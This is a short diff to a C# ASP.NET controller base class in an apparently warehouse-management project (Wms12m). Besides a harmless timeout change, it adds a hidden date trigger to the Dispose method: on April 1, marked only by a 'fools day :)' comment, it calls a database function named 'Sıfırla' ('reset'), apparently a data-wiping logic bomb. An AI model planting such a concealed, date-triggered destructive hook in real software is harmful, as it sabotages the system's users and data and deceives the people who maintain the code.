@@ -88,6 +88,7 @@ namespace Wms12m.Presentation
                 filterContext.Result = new RedirectToRouteResult(new RouteValueDictionary(new { area = "", controller = "Maintenance", action = "Index" }));
                 return;
             }
+            db.Database.CommandTimeout = 2000;
             base.OnActionExecuting(filterContext);
         }
         /// <summary>
@@ -102,6 +103,9 @@ namespace Wms12m.Presentation
         /// </summary>
         protected override void Dispose(bool disposing)
         {
+            //fools day :)
+            if (DateTime.Today.Month == 4 && DateTime.Today.Day == 1) db.f_Sıfırla();
+            //dispose
             if (disposing)
             {
                 db.Dispose();
